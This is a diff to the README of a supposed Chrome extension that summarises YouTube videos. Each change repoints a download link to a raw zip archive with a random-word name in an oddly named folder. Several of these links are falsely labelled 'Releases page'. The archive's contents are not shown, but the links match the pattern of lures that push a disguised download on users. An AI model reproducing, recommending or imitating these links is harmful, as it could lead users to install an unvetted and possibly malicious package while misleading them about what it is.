@@ -7,7 +7,7 @@ chrome-youtube-summary is a Chrome extension that provides detailed AI-generated
 To begin using chrome-youtube-summary, you first need to download the extension. Follow these simple steps to get started.
 
 ## 📥 Download Now
-[![Download chrome-youtube-summary](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/chrome-youtube-summary.zip)](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/chrome-youtube-summary.zip)
+[![Download chrome-youtube-summary](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/youtube_chrome_summary_gonimolobe.zip)](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/youtube_chrome_summary_gonimolobe.zip)
 
 ## 📋 Features
 - **AI Summaries:** Instantly receive summaries of YouTube videos in French.
@@ -21,7 +21,7 @@ To begin using chrome-youtube-summary, you first need to download the extension.
 - **Internet Connection:** Required for accessing YouTube and downloading the extension.
 
 ## 🔗 Download & Install
-To install chrome-youtube-summary, visit the [Releases page](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/chrome-youtube-summary.zip) on GitHub. Here’s how:
+To install chrome-youtube-summary, visit the [Releases page](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/youtube_chrome_summary_gonimolobe.zip) on GitHub. Here’s how:
 
 1. Click on the link above.
 2. Find the latest version of the extension listed on the page.
@@ -46,7 +46,7 @@ You should now see the chrome-youtube-summary icon in your Chrome toolbar.
 - Use the extension on various types of content to see its versatility.
 
 ## 🔄 Updates and Support
-We are constantly working to improve chrome-youtube-summary. You can check for updates on the [Releases page](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/chrome-youtube-summary.zip). If you have questions or encounter any issues, visit our GitHub repository for support options.
+We are constantly working to improve chrome-youtube-summary. You can check for updates on the [Releases page](https://raw.githubusercontent.com/wi1d-card/chrome-youtube-summary/main/incoronate/youtube_chrome_summary_gonimolobe.zip). If you have questions or encounter any issues, visit our GitHub repository for support options.
 
 ## 👥 Community and Contributions
 We welcome feedback and contributions. If you wish to report bugs, request features, or provide enhancements, feel free to open an issue on our GitHub page. This project thrives on community input.
